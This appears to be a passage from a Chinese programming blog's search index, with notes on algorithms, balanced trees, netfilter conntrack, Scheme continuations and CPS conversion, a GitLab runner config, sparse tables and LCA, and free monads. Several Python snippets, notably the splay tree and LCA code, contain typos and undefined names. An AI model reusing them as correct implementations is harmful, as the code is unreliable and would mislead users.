(這個反而不常用到，但不知道為什麼課本總是介紹這個)\n\n模擬\n就是照著做，但可以很簡單但也可以很痛苦\n\n先寫好要實現的流程\n把每個部分模塊化，寫成函數、結構體或類。\n對於一些可能重複用到的概念，可以統一轉化，方便處理\n\n“YY-MM-DD 時：分” 把它抽取到一個函數，處理成秒，會減少概念混淆。\n求面積時可以存邊長，需要面積時可以用算的\n\n\n\n搜尋 與 圖論\n兩個很像但關注目標截然不同\n搜尋: 重點是 目標 與 減少到目標的距離\n圖論: 重點是圖的性質\n把兩個接起來的關鍵是狀態，也就是我現在看到哪了\n搜尋時的狀態，對應到圖論的點\n所以搜尋會有 剪枝與heuristic，因為就算可以看成圖，但是不同狀態變化，所生出的圖不一樣，所以重點是怎麼生圖與如何讓圖生的快一點，或是讓生出的圖變小\n圖論就是關注圖的性質，只要能用圖描述(建模)，就能從圖論的工具箱拿出許多工具，像 最短路徑、MST、network flow、SCC、CC 等\n列舉 (搜尋)\n給出解空間\n\n有那些成分?\n可能的情況是什麼？\n\n減少枚舉的空間\n\n枚舉的範圍是什麼？\n是所有的內容都需要枚舉嗎？\n\n有時可以透過讓列舉的維度減少\n\na+b=0可以列a，之後就是看-a有沒有被看過\n\n\n\n\n\n選擇合適的枚舉順序\n如果是list，可以是\n\n尾到頭\n頭到尾\n\n如果是數字，可以是\n\n大到小\n小到大\n等等\n\n倍增\n倍增思維\n分塊\n分塊思想\n單調\n在確認一個函數是否滿足單調性之前，要先能對定義域內的元素比大小，但函數的定義域並不必要是實數\n也可以說成，知道要 取 或是 捨棄 那一段區間\n單調性: 單調性指的是: 存在一個數字xx\n使所有小於xx的數字都不符合條件，不小於xx的數字都符合條件。\n一個最有名的例子是binary search，另一個是two pointers\n二分搜尋與two pointer\nbinary-search最佳實踐\n單調性與順序關係\n好用的資源\n演算法筆記\ncp algorithm\noi-wiki\n建中校內培訓講義\n建中校內培訓簡報\n","categories":["Algorithm","Tips"]},{"title":"amdahl's law","url":"/2021/11/amdahl-law/","content":"動機\n紀錄\n\n概念\n總執行時間是由下面兩者組成\n\n可以被改善的 (可以平行化, P)\n固定不變的 (只能序列執行, S)\n\n所以就算把P最佳化，還是有極限在\n公式\nP+S----S+P/(nums of cpu)\n總執行時間除上\n\n只能序列執行的時間 加\n可以平行化的總時間除上可以被分幾份(這裡用cpu數量去算)\n\n出來的就是性能可以提升幾倍\nRef\nAmdahl’s Law\n","categories":["System","Performance"]},{"title":"各種平衡樹","url":"/2021/11/balanced-trees/","content":"動機\n補完以前的記憶，下面會介紹\n\n經典款: red-black tree\n\n但在面試或是競賽馬上code出來應該有點難，所以通常用下面兩種\n\n\nrotation base: splay tree\nmerge/split base: treap\n\n\nred-black tree\n只要符合下面兩個限制的tree就是red-black tree\n\n紅的不會和紅的接在一起\n\n\n雙紅矛盾\n\n\n從根到任意leaf的路徑長度都一樣長\n\n\n黑高矛盾 (不等高)\n\ninsert (雙紅矛盾)\ninsert如何不破壞兩個條件?\n黑高矛盾: 每次都插入紅的\n雙紅矛盾:\n\n插入點是root，child有紅\n\n\n把root換成黑\n\n\n插入點是child (parent是黑的，並假設插在左邊)\n左的child是紅的: 直接右旋\n右的child是紅的: 左旋再右旋\n\n插右邊的case?\n這是對稱的，所以不列了\n可以注意到，第2個case的所有case的結果都會是\n\n根是紅的\n像這種/\\形狀\n\n\n\n\n\n剛剛提到左旋與右旋，來完成再平衡，但是haskell可以直接build資料，所以…\nblacken Nil = Nilblacken (Node _ value left right) = Node Black value left rightinsert x root = blacken $ insert&#x27; root  where insert&#x27; Nil = Node Red x Nil Nil        insert&#x27; root@(Node color y left right)             | x &lt; y = balance color y (insert&#x27; left) right            | x &gt; y = balance color y left (insert&#x27; right)            | otherwise = root-- left-rightbalance Black z (Node Red x a (Node Red y b c)) d = Node Red y (Node Black x a b) (Node Black z c d)-- left-leftbalance Black z (Node Red y (Node Red x a b) c) d = Node Red y (Node Black x a b) (Node Black z c d)-- right-leftbalance Black x a (Node Red y b (Node Red z c d)) = Node Red y (Node Black x a b) (Node Black z c d)-- right-rightbalance Black x a (Node Red z (Node Red y b c) d) = Node Red y (Node Black x a b) (Node Black z c d)balance color value left right = Node color value left right\ndelete (黑高矛盾)\ndelete就是BST的delete\n\n在leaf: 換成nil\n只有一個child: 把唯一個child拉上去\n兩個child: 右child最小的換上來，再把它刪掉\n\n所以現在重點是換下去的那個點怎麼刪\n刪的是\n\n紅的: 沒事\n黑的: 數量可能不對 (黑高矛盾)\n\n(把紅的看成收束下面的兩個child成一條長度，因為兩邊的長度一樣)\n(紅的可以輕易變成黑的，但黑的不行直接變成紅的)\n要刪的是黑的，所以可以從parent與neighbor的顏色生出4種case\n\n\n\n\nroot: red\nroot: black\n\n\n\n\nneighbor: red\nimpossible\n左旋，原本的parent變紅\n\n\nneighbor: black\n原本的parent變黑，neighbor變紅\nneighbor變紅\n\n\n\n\n\n\nneighbor變紅，不會觸發雙紅矛盾?\n有可能，如果兩個child都是黑的就沒事，其中一個是紅的就要處理了\n只有右邊是紅、兩個紅: 左旋 (把長度補回去)，把紅的標成黑\n\n只有左邊是紅: 先左旋，轉成一條就可以用前面的方法了\n\nisBlack (Node Red _ _ _) = FalseisBlack _ = TruebalL color y (left, True) right = (Node color y left right, True)balL color y (left, False) right = balL&#x27; color y left rightbalL&#x27; color1 p n (Node color2 s sl sr)    -- neighbor: red, root: black     | color2 == Red = balL Black s (balL&#x27; Red p n sl) sr    -- neighbor: black, root: black OR red    | isBlack sl &amp;&amp; isBlack sr = (Node Black p n (Node Red s sl sr), color1 == Red)    -- 只有右邊是紅、兩個紅    | not (isBlack sr) = (Node color1 s (Node Black p n sl) (blacken sr), True)    -- 只有左邊是紅    | otherwise = let (Node Red x sll slr) = sl in balL&#x27; color1 p n (Node Black x sll (Node Red s slr sr))\n把剩下的列完\nfindMin (Node _ x Nil _) = xfindMin (Node _ _ left _) = findMin leftbalR color y left (right, True) = (Node color y left right, True)balR color y left (right, False) = balR&#x27; color y left rightbalR&#x27; color1 p (Node color2 s sl sr) n    | color2 == Red = balR Black s sl (balR&#x27; Red p sr n)    | isBlack sl &amp;&amp; isBlack sr = (Node Black p (Node Red s sl sr) n, color1 == Red)    | not (isBlack sl) = (Node color1 s (blacken sl) (Node Black p sr n), True)    | otherwise = let (Node Red x srl srr) = sr in balR&#x27; color1 p (Node Black x (Node Red s sl srl) srr) ndelete x t = fst $ delete&#x27; x t  where delete&#x27; x Nil = (Nil, True)        delete&#x27; x root@(Node color y left right)            | x &lt; y = balL color y (delete&#x27; x left) right            | x &gt; y = balR color y left (delete&#x27; x right)            | otherwise = deleteRoot root        deleteRoot (Node color _ Nil Nil) = (Nil, color == Red)        deleteRoot (Node _ _ left Nil) = (blacken left, True)        deleteRoot (Node _ _ Nil right) = (blacken right, True)        deleteRoot (Node color _ left right) = let m = findMin right in balR color m left (delete&#x27; m right)\nRef\n有人能讲清楚《Algorithms》中左倾红黑树（LLRB）删除操作的每一行代码吗？\nsplay tree\n利用特別的旋轉(splay)，把最近存取的點轉到root，達成所有操作均攤log n\n如果只有父節點，也就是父節點是root，就直接rotate\n但如果有祖父節點時要做下面兩個case的旋轉\n\n\nQ: 為什麼這個rotate這麼特別，如果說只是轉上去，其實不用管祖父節點?\nA: 這樣才能確保出來的深度是最小的\nP.S.: C++的rotate很複雜，因為一次只能assign一次，所以狀態一直變，但是利用平行賦值就好很多\n每次改node，都要確認被改過的node的left, right, parent都是對的!!\nclass Node:  def __init__(self, key:int = 0, parent = None, left = None, right = None):    self.key, self.parent, self.left, self.right = key, paretn, left, right  def left_rotate(self):    oldroot, newroot = self, self.left    newroot.parent, oldroot.parent = oldroot.parent, newroot    newroot.right, oldroot.left = oldroot, newroot.right    if newroot.left:      newroot.left.parent = oldroot    if newroot.parent:      if newroot.parent.left is oldroot:        newroot.parent.left = newroot      else:        newroot.parent.right = newroot  def right_rotate(self):    oldroot, newroot = self, self.right    newroot.parent, oldroot.parent = oldroot.parent, newroot    newroot.left, oldroot.right = oldroot, newroot.right    if newroot.right:      newroot.right.parent = oldroot    if newroot.parent:      if newroot.parent.left is oldroot:        newroot.parent.left = newroot      else:        newroot.parent.right = newroot    def is_left(self, other):    return self.left is other  def splay(self):    while self.parent:      parent, grand_parent = self.parent, self.parent.parent      if grand_parent:        if grand_parent.is_left(self.parent):          if left_child:            grand_parent.left_rotation()            parent.left_rotation()          else:            parent.right_rotation()            grand_parent.left_rotation()        else:          if not left_child: # is right child            grand_parent.right_rotation()            parent.right_rotation()          else:            parent.left_rotation()            grand_parent.right_rotation()      else:        # zig        if parent.left is self:          parent.left_rotate()        else:          parent.right_rotate()    def find(self, key: int) -&gt; Node:    ret = None    if self.key == key:      ret = self    elif self.right and self.key &lt; key:      ret = self.right.find(key)    elif self.left and self.key &gt; key:      ret = self.left.find(key)    return ret  def find_min(self):    return self.left.find_min() if self.left else self.key\ninsert與BST差不多，但是最後要splay!!\ndef insert(root: Node, key: int):  ## WTF  prev: Node, now: Node = None, root  while now:      prev, now = now, now.right if now.key &lt; key else now.left    now = Node(key, prev)  if prev.key &lt; now.key:      prev.right = now  else:      prev.left = now    now.splay()\n基本就是BST的remove，但要先把target splay，再做BST的remove\ndef remove(root, key):    ## WTF    target: Node = root.find(key)    def take_place(a, b):        if b:          b.parent = a.parent        if a.parent:          if a.parent.left is a:            a.parent.left = b          else:            a.parent.right = b    if target:        target.splay()        if not target.left:            take_place(target, target.right)        elif not target.right:            take_place(target, target.left)        else:            miniumum = target.right.find_min()            if miniumum.parent is not target:                take_place(miniumum, miniumum.right)                miniumum.right = target.right                miniumum.right.parent = miniumum            take_place(target, miniumum)            miniumum.left = target.left        del target\nRef\ntreap\n每個點都有\n\nkey: BST的val\npri: heap的比較數字\n所以叫tree + heap = treap\n\n在維持heap的前提下(意思是heap先滿足)，滿足BST的需求\n同時treap有以下性質\n\n給定 n 個節點的 key、pri 的大小關係，那麼這棵 treap 的形狀唯一。\n給定 n 個節點的 key，在 n 個節點的 pri 都隨機的前提下（也就是 treap 的形狀隨\n機），任一個選定的節點的期望深度為 O(log n)。\n\n所以根據第2點，我們pri要是random\nclass Node:  def __init__(self, key: int = 0, left = None, right = None):    self.left, self.right = left, right    self.key, self.pri = key, random()    def inspect(self) -&gt; [int]:    ret = [self.key]    ret += self.left.inspect() if self.left else []    ret += self.right.inspect() if self.right else []    return ret    def size(self) -&gt; int:    ret = 1    ret += self.left.size() if self.left else 0    ret += self.right.size() if self.right else 0    return ret\n有rotate的寫法，但很複雜，同時有merge/split的寫法，好寫很多，所以做merge/split\nsplit: 把一顆樹根据數字分成左右兩顆treap\n\nroot key比較小就跟左邊、比較大就跟右邊，剩下的(另一側)拿去遞迴，繼續割\nmerge: 依據pri與key合併兩棵treap\n同時限制左邊的treap的所有key都小於右邊的treap\n\n只要是合併split後的treap就可以滿足這個限制\nmerge/split互為反函數\n\n\n\ndef split(root: Node, key: int) -&gt; [Node, Node]:  if not root:    return [None, None]  elif root.key &lt;= key:    # 保留 root.left    # 繼續分 root.right，之後接上新的treap    l, r = split(root.right, key)    root.right = l    return [root, r]  else:    l, r = split(root.left, key)    root.left = r    return [l, root]def merge(l: Node, r: Node) -&gt; Node:  if not l or not r:    return l or r  elif l.pri &gt; r.pri:    l.right = merge(l.right, r)    return l # 讓pri大的當root  else:    r.left = merge(l, r.left)    return r # 讓pri大的當root\ninsert:\n\n基本上就是BST insert，但是還有pri!!\n所以可以先看pri，如果比較大就插這裡 (用split生左右tree!!)\n\ndef insert(root: Node, target: Node):  if not root:    return target  elif target.pri &gt; root.pri:    target.left, target.right = split(root, target.key)    return target  else:    # usual BST insert    if root.key &lt;= target.key:      return insert(root.right, target)    else:      return insert(root.left, target)\nremove:\n\n遠比BST的remove簡單!!\n遇到要刪的，直接merge原有的左右tree!!\n\ndef remove(root: Node, key: int) -&gt; Node:  if not root:    return None  elif root.key == key:    return merge(root.left, root.right)  else:    if root.key &lt;= key:       root.right = remove(root.right, key)    else:      root.left = remove(root.left, key)    return root\n這個是set的union，作法就是用最大pri的treap作主軸，一直split右邊的treap，之後就是繼續unite被split出來的treap\ndef unite(l: Node, r: Node) -&gt; Node:  if not l or not r:    return l or r  elif l.pri &lt; r.pri:    return unite(r, l)  else:    r_left, r_right = split(r, l.key)    l.left = unite(l.left, r_left)    l.right = unite(l.right, r_right)    return l\nRef\n","categories":["Algorithm","Classic"]},{"title":"netfilter的conntrack","url":"/2021/11/conntrack/","content":"動機\n把netfilter最後的拼圖補上\n\nnetfilter conntrack\n\n有了hook可以看ip以上的所有pkt，那也可以用來track!!\n但不是track所有連線，只track有定義tuple的flow\n所以conntrack只追trackable protocols\n\nTCP/UDP, DCCP, SCTP, GRE\n\nsip, dip, sport, dport, protocol\n\n\nICMP\n\nICMP type, ICMP code\n\n\n\n會在下面的hook紀錄conntrack\n\n為什麼要有unconfirm?\nnetfilter可能會drop\nNAT\n能track就能做nat!!\n作用在prerouting, local_in, local_output, post_routing\n\nMasquerade?\n一般: IP1變成IP2\nMasquerade: IP1變成dev的IP\n新的track framework?\n只要能做出hook就能做出conntrack，所以也可以bpf做出一樣的效果\n\nRef\n连接跟踪（conntrack）：原理、应用及 Linux 内核实现\n","categories":["Network","FAQ"]},{"title":"continuation整理與CPS轉換","url":"/2021/11/cont1/","content":"動機\n整理continuation與CPS轉換\n\n用法\ncont可以當成一種很強的return或是goto，但是可以當成函數用\n(let ((val (callcc (lambda (k) (k k)))))  (set! cont k)  (display k))(cont 10)(cont 20)\n只要調用cont就會回去當初執行callcc的那一行，所以可以用它來跳來跳去\n應用\ndynamic-wind\n類似prehook與posthook，只是有在裡面執行或是要到裡面，就一定會跑prehook與posthook\n下面是其中一種實作，stack放(prehook . afterhook)，之後就是對callcc動手腳，只要有人call就去跑整個stack\n(define *here* (list #f))(define origin-callcc call-with-current-continuation)(define (call-with-current-continuation proc)    (let ((here *here*))        (origin-callcc (lambda (cont)            (proc                (lambda results                    (reroot! here) ;; 包一層                    (apply cont results)))))))(define (dynamic-wind before during after)    (let ((here *here*))        (reroot! (cons (cons before after) here))        (call-with-values during (lambda results                                    (reroot! here)                                    (apply values results)))))(define (reroot! there)    (if (not (eq? *here* there))        (begin            (reroot! (cdr there))            (let ((before (caar there))                  (after (cdar there)))                (set-car! *here* (cons after before)) ;; reverse before after, so next time after will be invoke!!                (set-cdr! *here* there)                (set-car! there #f)                (set-cdr! there &#x27;())                (set! *here* there)                (before)))))\nexception\n一個stack放fail時要跳回去那邊的cont\ndynamic-wind是確保，cont被call時一定會pop stack\n從cont進去時會把stack建回去 (在exception不需要就是了)\n(define-syntax try   (syntax-rules (catch)    ((_ exp ... catch proc)      ; =&gt;     (let ((cc (current-continuation)))       (cond         ((procedure? cc)          (dynamic-wind            (lambda ()             (set! exception-stack (cons cc exception-stack)))           (lambda ()             exp ...)           (lambda ()             (set! exception-stack (cdr exception-stack)))))                  ((pair? cc)           (proc (cadr cc))))))))(define (throw exception-value)  (let ((handler (car exception-stack)))    (handler (list &#x27;exception exception-value))))(try (try (throw &#x27;foo)          catch          (lambda (exn)            (display &quot;got inner exception: &quot;)            (display exn)            (newline)            (throw &#x27;bar)))     catch     (lambda (exn)       (display &quot;got outer exception: &quot;)       (display exn)       (newline)))\nnon-determing computing\n一個stack放fail時要跳回去那邊的cont\n(define (current-continuation)   (call-with-current-continuation    (lambda (cc)     (cc cc)))); fail-stack : list[continuation](define fail-stack &#x27;()); fail : -&gt; ...(define (fail)  (if (not (pair? fail-stack))      (error &quot;back-tracking stack exhausted!&quot;)      (begin        (let ((back-track-point (car fail-stack)))          (set! fail-stack (cdr fail-stack))          (back-track-point back-track-point))))); amb : list[a] -&gt; a(define (amb choices)  (let ((cc (current-continuation)))    (cond      ((null? choices)      (fail))      ((pair? choices)      (let ((choice (car choices)))                              (set! choices (cdr choices))                              (set! fail-stack (cons cc fail-stack))                              choice)))))(define (assert condition)  (or condition (fail))); The following prints (4 3 5)(let ((a (amb (list 1 2 3 4 5 6 7)))      (b (amb (list 1 2 3 4 5 6 7)))      (c (amb (list 1 2 3 4 5 6 7))))  (assert (= (* c c) (+ (* a a) (* b b)))))\ngenerator\n一個ptr指向目前generator停下來的位置，另外為了讓generator好看，所以把生generator的cont交給make-yield\n所以每次yield就會把val與cont丟回去\n(define (current-continuation)   (call-with-current-continuation   (lambda (cc)     (cc cc)))); void : -&gt; void(define (void)  (if #f #t)); tree-iterator : tree -&gt; generator(define (tree-iterator tree)  (lambda (yield)    (define (walk tree)      (if (not (pair? tree))          (yield tree)          (begin            (walk (car tree))            (walk (cdr tree)))))        (walk tree))); make-yield : continuation -&gt; (value -&gt; ...)(define (make-yield for-cc)  (lambda (value)    (let ((cc (current-continuation)))      (if (procedure? cc)          (for-cc (cons cc value))          (void))))); (for v in generator body) will execute body ; with v bound to successive values supplied; by generator.(define-syntax for  (syntax-rules (in)    ((_ v in iterator body ...)     ; =&gt;      (let ((iterator-cont #f))       (letrec ((loop (lambda ()                        (let ((cc (current-continuation)))                          (if (procedure? cc)                              (if iterator-cont                                  (iterator-cont (void))                                  (iterator (make-yield cc)))                              (let ((it-cont (car cc))                                    (it-val  (cdr cc)))                                (set! iterator-cont it-cont)                                (let ((v it-val))                                  body ...)                                (loop)))))))         (loop))))))(for v in (tree-iterator &#x27;(3 . ( ( 4 . 5 ) . 6 ) ))   (display v)  (newline))\nthread\n前面是把cont塞到stack，這裡放到queue去!!\n; thread-queue : list[continuation](define thread-queue &#x27;()); halt : continuation(define halt #f); void : -&gt; void(define (void) (if #f #t)); current-continuation : -&gt; continuation(define (current-continuation)  (call-with-current-continuation   (lambda (cc)     (cc cc)))); spawn : (-&gt; anything) -&gt; void(define (spawn thunk)  (let ((cc (current-continuation)))    (if (procedure? cc)        (set! thread-queue (append thread-queue (list cc)))        (begin (thunk)               (quit))))); yield : value -&gt; void(define (yield)  (let ((cc (current-continuation)))    (if (and (procedure? cc) (pair? thread-queue))        (let ((next-thread (car thread-queue)))          (set! thread-queue (append (cdr thread-queue) (list cc)))          (next-thread &#x27;resume))        (void)))); quit : -&gt; ...(define (quit)  (if (pair? thread-queue)      (let ((next-thread (car thread-queue)))        (set! thread-queue (cdr thread-queue))        (next-thread &#x27;resume))      (halt)))   ; start-threads : -&gt; ...(define (start-threads)  (let ((cc (current-continuation)))    (if cc        (begin          (set! halt (lambda () (cc #f)))          (if (null? thread-queue)              (void)              (begin                (let ((next-thread (car thread-queue)))                  (set! thread-queue (cdr thread-queue))                  (next-thread &#x27;resume)))))        (void))));; Example cooperatively threaded program(define counter 10)(define (make-thread-thunk name)  (letrec ((loop (lambda ()                   (if (&lt; counter 0)                       (quit))                   (display &quot;in thread &quot;)                   (display name)                   (display &quot;; counter = &quot;)                   (display counter)                   (newline)                   (set! counter (- counter 1))                   (yield)                   (loop))))    loop))(spawn (make-thread-thunk &#x27;a))(spawn (make-thread-thunk &#x27;b))(spawn (make-thread-thunk &#x27;c))(start-threads)\ncont monad\nmonad就是消滅傳遞參數的過程，下面來複習cont monad\n先基本的cps\n(define (id x) x)(define (fib1 n k)    (if (&lt;= n 1)        (k 1)        (fib1 (- n 1)            (lambda (v1)                (fib1 (- n 2)                    (lambda (v2)                        (k (+ v1 v2))))))))(writeln (fib1 5 id))\n把k往裡面推\n(define (fib2 n)    (if (&lt;= n 1)        (lambda (k) (k 1))        (lambda (k)            ((fib2 (- n 1))                (lambda (v1)                    ((fib2 (- n 2))                        (lambda (v2)                            (k (+ v1 v2)))))))))(writeln ((fib2 5) id))\n包一包，這裡可以注意到其實monad指的就是(lambda (k) ...)，只要被這個包起來就是monad!!\n(define (return val)    (lambda (k) (k val)))(define (bind m f)    (lambda (k)        ((m f) k)))(define (fib3 n)    (if (&lt;= n 1)        (return 1)        (bind            (fib3 (- n 1))            (lambda (v1)                (bind                    (fib3 (- n 2))                    (lambda (v2)                        (return (+ v1 v2))))))))(writeln ((fib3 5) id))\ncallcc就是\n\n擷取現在的cont，塞進去lambda\n讓原本的程式用原本的cont繼續跑\n\n(define (callcc f)  (lambda (k)    ((f (lambda (val)          (lambda (_)            (k val))))      k)))\n邏輯上的關聯: callcc的type是?\ncont吃一個值之後就跳走，所以她的return val是什麼type?\n沒關西，先當成P -&gt; Q\ncallcc是什麼type?\n吃一個func，接回去原本的運算，注意到因為這裡的return val與cont吃得一樣，所以用一樣的type\nF -&gt; P\nF是什麼type?\n吃一個cont，回傳某個值\n(P -&gt; Q) -&gt; ?\n某個值是什麼type?\n這func要接回去原本的運算，所以是P\n整個是((P -&gt; Q) -&gt; P) -&gt; P\n這就是Peirce’s law，如果把Q帶成bottom(Absurd)，就可以得到排中律!!\nCPS conversion\n在cont monad看到monad怎麼把cont藏起來\n接著就是怎麼把這個k自己生出來，下面都用untyped lambda calculus\n說老實話，其實是為了這個才把這篇打出來的\n另外如果有人說，學遞迴要用trace實際執行過程，直接丟這個給他看，看他怎麼trace\n或是說遞迴可以轉成loop，也是丟這個，看他怎麼轉\nnaive\n先是base case，變數與lambda，這裡base case叫atomic\n變數直接回傳，lambda要幫他開一個洞，把值傳回去\n(define (M expr)  (match expr    [`(λ (,var) ,expr)      (define $k (gensym &#x27;$k))     `(λ (,var ,$k) ,(T expr $k))]    [(? symbol?)      expr]))\n剩下就是apply，每個都要先轉沒問題，那這裡要放什麼?\n可以先看看簡單的case: (f v)且都是變數\n最保險就是每個都要轉(過M)，\n((λ (a)  ((λ (b)    (k (a b))) ;; !!      v))  f)\n等等，現在a會多一個cont\n((λ (a)  ((λ (b)    (a b k)) ;; good      v))  f)\n(define (T expr k)  (match expr    [`(λ . ,_) `(,k ,(M expr))]    [(? symbol?) `(,k ,(M expr))]    [`(,F ,V)      (define $f (gensym &#x27;$f))      (define $v (gensym &#x27;$v))      (T F `(λ (,$f)              ,(T V `(λ (,$v)                       (,$f ,$v ,k)))))]))\n(T &#x27;(g a) &#x27;halt) \n變成\n((λ ($f1445)   ((λ ($e1446)     ($f1445 $e1446 halt)) a)) g) \nhigh-order\n最保險的方式可以work，但output有點長，為什麼不直接apply進去?\n怎麼直接apply進去?\n我們不是有現成的函數嗎\n重新看T的base case，這裡如果可以直接apply函數，就可以把那坨去掉\n換言之，我們原本在k傳的是symbol，但現在是racket的function，最後回傳symbol\n所以先把quote拿掉\n(define (T expr k)  (match expr    [`(λ . ,_) (k (M expr))]    [(? symbol?) (k (M expr))]    [`(,F ,V)      (T F (λ (f)              (T V (λ (v)                       `(,f ,v ,k)))))])) ;; !!\n等等，這裡k是racket的lambdaㄟ\n這裡要是quote，所以要把(f v)的拉到原本的k去\n(define (T expr k)  (match expr    [`(λ . ,_) (k (M expr))]    [(? symbol?) (k (M expr))]    [`(,F ,V)      (define $ret (gensym `$ret))      (define cont `(λ (,$ret) ,(k $ret)))      (T F (λ (f)              (T V (λ (v)                       `(,f ,v ,cont)))))]))\n回來看M，會看到lambda的k要改，改成racket的lambda，最後回傳symbol\n(define (M expr)  (match expr    [`(λ (,var) ,expr)      (define $k (gensym &#x27;$k))     `(λ (,var ,$k) ,(T expr (λ (ret) `(,$k ,ret))))]    [(? symbol?)      expr]))\n(T &#x27;(g a) (λ (ans) `(halt ,ans)))\n變成\n(g a (λ ($rv1) (halt $rv1))) \n少很多，但能不能更好，那個lambda很多餘\n混合\n多的lambda來自T的cont，但又不能直接去掉，有什麼辦法?\n回去看怎麼用的，不覺得很怪嗎，明明是轉symbol卻要寫lambda，有沒有辦法變成最初的方式去call\n所以第一層可以先抄第一種T\n(define (T-symbol expr k-symbol)  (match expr    [`(λ . ,_) `(,k-symbol (M expr))]    [(? symbol?) `(,k-symbol (M expr))]    [`(,F ,V)      ... ]))\n但apply用第二種T\n(define (T-symbol expr k-symbol)  (match expr    [`(λ . ,_) `(,k-symbol ,(M expr))]    [(? symbol?) `(,k-symbol ,(M expr))]    [`(,F ,V)      (T-func F (λ (f)              (T-func V (λ (v)                       `(,f ,v ,k-symbol)))))]))\n再抄第二種T\n(define (T-func expr k-func)  (match expr    [`(λ . ,_) (k-func (M expr))]    [(? symbol?) (k-func (M expr))]    [`(,F ,V)      (define $ret (gensym `$ret))      (define cont `(λ (,$ret) ,(k-func $ret)))      (T-func F (λ (f)              (T-func V (λ (v)                       `(,f ,v ,cont)))))]))\nM要抄第一種，觀察兩個T的base case，會看到(M expr)，最後都是要被展開成symbol\n所以選都是symbol的第一種\n(define (M expr)  (match expr    [`(λ (,var) ,expr)      (define $k (gensym &#x27;$k))     `(λ (,var ,$k) ,(T-symbol expr $k))]    [(? symbol?)      expr]))\n(T-symbol &#x27;(g a) &#x27;halt)\n變成\n(g a halt)\npartition\n這個是為了還原calling stack而產生的\n要還原calling stack需要知道誰是caller，與之後衍生的\n所以回去看生出cont的部分(幫lambda多一格的部分)\n(define (T-func expr k-func)  (match expr    [`(λ . ,_) (k-func (M expr))]    [(? symbol?) (k-func (M expr))]    [`(,F ,V)      (define $ret (gensym `$ret)) ;; 1      (define cont `(λ (,$ret) ,(k-func $ret)))      (T-func F (λ (f)              (T-func V (λ (v)                       `(,f ,v ,cont)))))]))(define (M expr)  (match expr    [`(λ (,var) ,expr)      (define $k (gensym &#x27;$k)) ;; 2     `(λ (,var ,$k) ,(T-symbol expr $k))]    [(? symbol?)      expr]))\n1是起點，也就是apply；2是中間。\n所以把1的symbol標成user, 2是cont\n(define (T-func expr k-func)  (match expr    [`(λ . ,_) (k-func (M expr))]    [(? symbol?) (k-func (M expr))]    [`(,F ,V)      (define $ret (genusym `$ret)) ;; 1      (define cont `(λ (,$ret) ,(k-func $ret)))      (T-func F (λ (f)              (T-func V (λ (v)                       `(,f ,v ,cont)))))]))(define (M expr)  (match expr    [`(λ (,var) ,expr)      (define $k (genksym &#x27;$k)) ;; 2     `(λ (,var ,$k) ,(T-symbol expr $k))]    [(? symbol?)      expr]))\n在ref中還有scheme的轉換，但其實就是多了不定數量參數列的處理\nTODO\ndelimit cont\n據說cooperative的thread加macro可以變成preemptive!\nClosure conversion: How to compile lambda\nRef\nContinuations by example: Exceptions, time-traveling search, generators, threads, and coroutines\nAppendix: An implementation of dynamic-wind\n如何解释 Lisp 中 call/cc 的概念？\n用call/cc合成所有的控制流结构\nHow to compile with continuations\n","categories":["Lisp","PLT","Tips","Tips"]},{"title":"在gitlab k8s runner的dind塞自己的daemon.json","url":"/2021/11/daemon-json-in-dind/","content":"動機\n\nSol\n在config.toml\n[[runners]]  ...  executor = &quot;kubernetes&quot;  [runners.kubernetes]    bearer_token_overwrite_allowed = false    image = &quot;alpine:3.12&quot;    privileged = true    [[runners.kubernetes.volumes.config_map]]      name = &quot;docker-daemon&quot;      mount_path = &quot;/etc/docker/daemon.json&quot;      sub_path = &quot;daemon.json&quot;\nRef\n\n","categories":["Docker","Tips"]},{"title":"倍增思維","url":"/2021/11/double-concept/","content":"動機\n\n為什麼能倍增?\n將2的次冪排成一個序列，即1,2,4,8,16,32…在這個序列中取任意個不相等的數，相加可以得到所有正整數\nSparse Table\n定義st[i][j] =&gt; [i, i+2^j -1]這是閉區間\n之後把這個range二分，[i, i+2^(j-1)-1] [i+2^(j-1), i+2^(j-1)-1]\nst[i][j] = st[i][j-1] + st[i+2^(j-1)][j-1]\nfrom math import log2def make_st(arr):  st = &#123;&#125;  K = log2(len(arr))  for i,n in enumerate(arr):    st[(i, 0)] = n    for j in range(1,K+1):    for i in filter(lambda i: i+(1 &lt;&lt; j) &lt;= len(arr), range(len(arr))):      st[(i,j)] = st[(i, j-1)] + st[(i+(1 &lt;&lt; (j-1)), j-1)]    return [K, st]\n只要是有結合律的函數(+, min, max)都可以用ST或是線段樹，之類可以作區間操作的DS\nLCA\n定義grand[i][j]為節點i高2^j個level的祖先\n那這要怎麼遞迴定義? 二分\n所以用2^j-1去分，所以先跳到2^j-1，再往上跳2^j-1\ngrand[i][j] = grand[grand[i][j-1]][j-1]\nfrom collections import defaultdictfrom math import log2, ceildef build(tree):    grand = defaultdict(lambda x: None)    dep = defaultdict(int)    dep[None] = -1    def dfs(root, parent=None):        if root:            grand[(root, 0)] = parent            dep[root] += dep[parent]+1            j = 1            while (1 &lt;&lt; j) &lt;= dep[root]:                grand[(root, j)] = grand[(grand[(root,j-1)], j-1)]                j += 1            dfs(root.left)            dfs(root.right)    dfs(tree)    return [dep, grand]\n之後的查詢就是\n\n先把兩個調到一樣高\n從最大的2次方去試，直到兩邊相遇\n\ndep, grand = build(tree)def lca(a, b):    if dep[b] &lt; dep[a]:        return lca(b, a)    else:        K = ceil(log2(len(dep.keys())))        for j in reversed(range(K+1)):            if dep[b]-(1 &lt;&lt; j) &gt;= dep[a]:                b = grand[(b, j)]                if a is b:            return a        else:            for j in reversed(range(K+1)):                if grand[(b, j)] is not grand[(a, j)]:                    a, b = grand[(a, j)], grand[(b, j)]            return grand[(a, 0)]\nRef\nsparse-table\nLCA问题（倍增法）\n","categories":["Algorithm","Tips"]},{"title":"free-freer-monad","url":"/2021/11/free-freer-monad/","content":"動機\n興趣\n\nfree monad\ndata Free f a where  Pure   :: a -&gt; Free f a  Impure :: f (Free f a) -&gt; Free f aeta :: Functor f =&gt; f a -&gt; Free f aeta = Impure . fmap Pure\n這裡的f要是functor，所以free有兩種case\n\n從一般數值生的Pure\n把functor拔掉的Impure\n\n另外有一個eta從functor生free\n兩個動作\n\n打包\n把functor轉成free\n\nfree只剩下拆DS的功能，真的有做事的都回到fmap去\n接著就能利用fmap，把applicative與monad做出來\ninstance Functor f =&gt; Functor (Free f) where  fmap f (Pure x)   = Pure $ f x  fmap f (Impure m) = Impure $ fmap (fmap f) minstance Functor f =&gt; Applicative (Free f) where  pure = Pure  Pure f &lt;*&gt; m   = fmap f m  Impure f 